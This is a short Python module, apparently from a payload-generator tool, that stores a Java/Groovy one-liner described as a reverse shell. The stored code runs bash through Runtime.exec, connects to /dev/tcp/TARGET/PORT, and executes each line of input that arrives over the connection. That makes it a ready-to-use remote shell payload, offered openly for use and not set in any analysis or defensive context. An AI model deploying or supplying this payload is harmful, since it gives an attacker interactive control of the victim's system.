class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Use java and bash to establish a reverse shell."
    function    = "reverse shell"
    liner       = """r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/TARGET/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()"""
